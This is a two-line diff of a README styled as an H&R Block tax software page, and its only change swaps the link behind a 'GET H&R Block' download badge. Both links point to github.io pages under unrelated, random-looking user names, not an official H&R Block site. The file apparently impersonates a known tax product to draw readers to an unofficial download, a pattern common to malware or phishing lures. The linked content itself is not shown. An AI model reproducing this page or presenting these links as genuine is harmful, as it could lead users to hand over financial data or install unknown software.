@@ -1,6 +1,6 @@
 # H&R Block Tax - Tax Filing Software, Online Returns, and Refund Help
 
-[![GET H&R Block](https://img.shields.io/badge/GET%20%E2%80%94%20H%26R%20Block-0078D6?style=for-the-badge&logoColor=white)](https://felixbauerxiot.github.io/.github/h-r-block)
+[![GET H&R Block](https://img.shields.io/badge/GET%20%E2%80%94%20H%26R%20Block-0078D6?style=for-the-badge&logoColor=white)](https://dakaridanieldyjz.github.io/.github/h-r-block-tax)
 
 ## Overview of H&R Block Tax Tools
 
